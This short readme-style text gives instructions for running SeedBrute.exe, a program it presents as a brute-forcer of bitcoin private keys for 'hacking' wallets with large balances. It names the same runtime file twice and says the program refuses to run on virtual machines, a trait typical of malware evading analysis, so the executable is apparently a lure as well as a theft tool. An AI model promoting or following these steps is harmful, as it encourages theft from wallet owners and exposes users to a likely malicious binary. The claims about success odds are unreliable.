To successfully run bitcoin brute, you need to install the auxiliary libraries vc_redist.x64.exe or vc_redist.x64.exe.
They are needed for the launch and correct operation of brute bitcoin wallets using private keys.
After that run SeedBrute.exe and wait for the brute to start.
After these conditions are met, the software will work correctly and you will increase the likelihood of hacking a wallet with a large balance.
The longer the software works, the more likely it is to find a good wallet. The program does not work on virtual machines.
